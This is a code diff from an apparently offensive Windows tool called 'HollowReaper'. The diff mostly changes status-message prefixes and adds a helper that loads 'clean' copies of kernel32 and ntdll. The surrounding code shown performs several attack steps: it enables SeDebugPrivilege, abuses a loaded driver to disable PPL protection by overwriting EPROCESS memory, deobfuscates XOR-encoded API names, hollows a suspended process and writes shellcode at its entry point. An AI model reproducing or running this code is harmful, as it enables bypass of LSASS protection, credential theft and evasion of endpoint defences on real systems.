@@ -171,7 +171,7 @@ int GetOSVersion() {
         &bufferSize
     );
     if (ret == ERROR_SUCCESS) {
-        wprintf(L"[+] Windows Build %s detected\n", CurrentBuild);
+        wprintf(L"[*] Windows Build %s detected\n", CurrentBuild);
         return _wtoi(CurrentBuild);
     }
     else {
@@ -373,7 +373,7 @@ SC_HANDLE CreateOrOpenDriverService(SC_HANDLE hSCM, const char* driverName, cons
         if (err == ERROR_SERVICE_EXISTS) {
             hService = OpenServiceA(hSCM, driverName, SERVICE_ALL_ACCESS);
             if (hService) {
-                printf("[*] Existing service opened successfully.\n");
+                printf("[+] Existing service opened successfully.\n");
             }
             else {
                 printf("[!] Unable to open the existing service. Error code: %lu\n", GetLastError());
@@ -387,7 +387,7 @@ SC_HANDLE CreateOrOpenDriverService(SC_HANDLE hSCM, const char* driverName, cons
         }
     }
     else {
-        printf("[*] Service created successfully.\n");
+        printf("[+] Service created successfully.\n");
     }
     return hService;
 }
@@ -438,7 +438,7 @@ int StopAndUnloadDriver(const char* driverName) {
     if (!hService) {
         DWORD err = GetLastError();
         if (err == ERROR_SERVICE_DOES_NOT_EXIST) {
-            printf("[*] Service does not exist.\n");
+            printf("[!] Service does not exist.\n");
             CloseServiceHandle(hSCM);
             return 0;
         }
@@ -448,7 +448,7 @@ int StopAndUnloadDriver(const char* driverName) {
             return 0;
         }
         else {
-            printf("[*] Error: %s.\n", err);
+            printf("[!] Error: %s.\n", err);
             CloseServiceHandle(hSCM);
             return 0;
         }
@@ -469,7 +469,7 @@ int StopAndUnloadDriver(const char* driverName) {
         }
     }
     else {
-        printf("[*] Service stopped successfully.\n");
+        printf("[+] Service stopped successfully.\n");
     }
 
     // Attempt to delete the service
@@ -503,7 +503,7 @@ void static disablePPL() {
 
     Offsets offs = getOffsets();
     if (offs.ActiveProcessLinks == 0 || offs.ImageFileName == 0 || offs.Protection == 0) {
-        printf("[!]Offset not mapped... exiting!\n");
+        printf("[!] Offset not mapped... exiting!\n");
         exit(1);
     }
 
@@ -553,7 +553,7 @@ void static disablePPL() {
             // To disable PPL, write 0x00 into this field.
             // Warning: perform this operation only if you are sure the offsets are correct.
             WriteMemoryPrimitive(Device, 1, eprocess + offs.Protection, 0x00);
-            printf("[*] PPL disabled (0x00 written)\n");
+            printf("[+] PPL disabled (0x00 written)\n");
 
             // Read the protection byte (PPL) from the EPROCESS again
             BYTE protection_post = (BYTE)ReadMemoryPrimitive(Device, 1, eprocess + offs.Protection);
@@ -569,11 +569,29 @@ void static disablePPL() {
 }
 
 // =====================================================
+// Function to load clean versions of DLLs
+// =====================================================
+HMODULE LoadCleanDLL(char* dllPath) {
+
+    HMODULE hDbghelp = LoadLibraryA(dllPath);
+    if (hDbghelp)
+    {
+        printf("[+] Loaded clean copy of dbghelp.dll at: %p\n", hDbghelp);
+    }
+    else
+    {
+        printf("[!] Failed to load dbghelp.dll. Error: %lu\n", GetLastError());
+    }
+
+    return hDbghelp;
+}
+
+// =====================================================
 // Main – Process Hollowing + LSASS EPROCESS Reading
 // =====================================================
 int main(int argc, char* argv[]) {
     // Start
-    printf("[*] Starting HollowReaper\n");
+    printf("[+] Starting HollowReaper\n");
 
     // Enabling SeDebugPrivilege
     HANDLE hToken = NULL;
@@ -601,21 +619,14 @@ int main(int argc, char* argv[]) {
         printf("[!] AdjustTokenPrivileges reported an error: %lu\n", GetLastError());
         return 1;
     }
-    printf("[*] SeDebugPrivilege enabled.\n");
+    printf("[+] SeDebugPrivilege enabled.\n");
 
-    // Load kernel32.dll and ntdll.dll, then deobfuscate API names
-    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
-    if (!hKernel32) {
-        printf("[!] Error loading kernel32.dll\n");
-        return 1;
-    }
-    
-    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
-    if (!hNtdll) {
-        printf("[!] Error loading ntdll.dll\n");
-        return 1;
-    }
-    
+    // Load clean versions of DLLs
+    char* kernel32Path = "C:\\Windows\\System32\\kernel32.dll";
+    HANDLE hKernel32 = LoadCleanDLL(kernel32Path);
+
+    char* ntdllPath = "C:\\Windows\\System32\\ntdll.dll";
+    HANDLE hNtdll = LoadCleanDLL(ntdllPath);
     
     const char* XOR_KEY = "0123456789abcdefghij";
     size_t key_len = strlen(XOR_KEY);
@@ -656,12 +667,12 @@ int main(int argc, char* argv[]) {
     char exePathA[MAX_PATH] = { 0 };
     if (argc > 1) {
         strncpy(exePathA, argv[1], MAX_PATH - 1);
-        printf("[*] Path provided from command line: %s\n", exePathA);
+        printf("[+] Path provided from command line: %s\n", exePathA);
     }
     else {
         printf("[*] Enter the full path of the executable: ");
         if (!fgets(exePathA, sizeof(exePathA), stdin)) {
-            printf("Error reading the path.\n");
+            printf("[!] Error reading the path.\n");
             return 1;
         }
         exePathA[strcspn(exePathA, "\r\n")] = '\0';
@@ -689,7 +700,7 @@ int main(int argc, char* argv[]) {
         return 1;
     }
     free(exePathW);
-    printf("[*] Process created in suspended state, PID: %lu\n", pi.dwProcessId);
+    printf("[+] Process created in suspended state, PID: %lu\n", pi.dwProcessId);
     
 
 
@@ -744,7 +755,7 @@ int main(int argc, char* argv[]) {
         printf("[!] WriteProcessMemory failed, error: %lu\n", GetLastError());
         return 1;
     }
-    printf("[*] Shellcode written at the EntryPoint.\n");
+    printf("[+] Shellcode written at the EntryPoint.\n");
 
     // Start the driver
     LoadAndStartDriver();
@@ -754,7 +765,7 @@ int main(int argc, char* argv[]) {
 
     // Resume the suspended process thread
     DWORD suspendCount = pRT(pi.hThread);
-    printf("[*] Thread resumed, suspend count: %lu\n", suspendCount);
+    printf("[+] Thread resumed, suspend count: %lu\n", suspendCount);
 
     // Unload the driver
     StopAndUnloadDriver(DRIVER_NAME);
@@ -763,6 +774,6 @@ int main(int argc, char* argv[]) {
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
 
-    printf("[*] Operation completed.\n");
+    printf("[+] Operation completed.\n");
     return 0;
 }
